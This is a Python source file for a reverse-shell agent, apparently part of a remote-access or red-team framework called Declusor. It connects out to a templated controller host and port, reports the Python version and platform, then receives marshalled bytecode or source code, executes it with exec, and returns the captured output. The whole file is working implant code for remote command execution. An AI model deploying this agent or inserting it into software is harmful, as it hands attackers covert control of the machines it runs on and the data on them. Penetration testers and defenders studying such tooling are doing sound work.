#!/usr/bin/env python3
"""Declusor py_socket compact reverse-shell agent."""

import importlib.util
import io
import json
import marshal
import platform
import socket
import struct
import sys

HOST = "$DECLUSOR_HOST"
PORT = int("$DECLUSOR_PORT")
ACKNOWLEDGE = bytes.fromhex("$DECLUSOR_ACKNOWLEDGE")

SESSION_SCOPE = {"__name__": "__declusor__"}


_CODE_TYPE = type((lambda: None).__code__)


def _read_exact(sock: socket.socket, length: int) -> bytes | None:
    buf = bytearray()

    while len(buf) < length:
        chunk = sock.recv(length - len(buf))

        if not chunk:
            return None

        buf.extend(chunk)

    return bytes(buf)


def _read_frame(sock: socket.socket) -> bytes | None:
    header = _read_exact(sock, 5)

    if header is None:
        return None

    _, length = struct.unpack(">BI", header)

    return _read_exact(sock, length)


def _send_frame(sock: socket.socket, channel: int, data: bytes) -> None:
    sock.sendall(struct.pack(">BI", channel, len(data)) + data)


def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
    buf = io.StringIO()
    old_out, old_err = sys.stdout, sys.stderr

    try:
        sys.stdout = sys.stderr = buf
        code = None
        try:
            obj = marshal.loads(payload_bytes)
            if isinstance(obj, _CODE_TYPE):
                code = obj
        except Exception:
            pass

        if code is None:
            source = payload_bytes.decode(errors="replace")
            code = compile(source, "<remote>", "exec")

        exec(code, SESSION_SCOPE)  # noqa: S102
    except (Exception, SystemExit) as exc:
        buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
    finally:
        sys.stdout, sys.stderr = old_out, old_err

    output = buf.getvalue().encode(errors="replace")

    if output:
        _send_frame(sock, 1, output)

    _send_frame(sock, 0, b"")


def main() -> None:
    with socket.create_connection((HOST, PORT)) as sock:
        SESSION_SCOPE["_send_frame"] = lambda ch, data: _send_frame(sock, ch, data)

        magic_hex = importlib.util.MAGIC_NUMBER.hex()
        metadata = json.dumps(
            {
                "version": list(sys.version_info[:3]),
                "magic": magic_hex,
                "platform": sys.platform,
                "implementation": platform.python_implementation(),
            }
        ).encode("utf-8")
        _send_frame(sock, 1, metadata)

        helpers_bytes = _read_frame(sock)

        if helpers_bytes:
            try:
                helpers_code = None
                try:
                    obj = marshal.loads(helpers_bytes)
                    if isinstance(obj, _CODE_TYPE):
                        helpers_code = obj
                except Exception:
                    pass

                if helpers_code is None:
                    helpers_code = compile(helpers_bytes.decode(errors="replace"), "<helpers>", "exec")

                exec(helpers_code, SESSION_SCOPE)  # noqa: S102
            except (Exception, SystemExit):
                pass

        sock.sendall(ACKNOWLEDGE)

        while (payload_bytes := _read_frame(sock)) is not None:
            _execute(payload_bytes, sock)



if __name__ == "__main__":
    main()

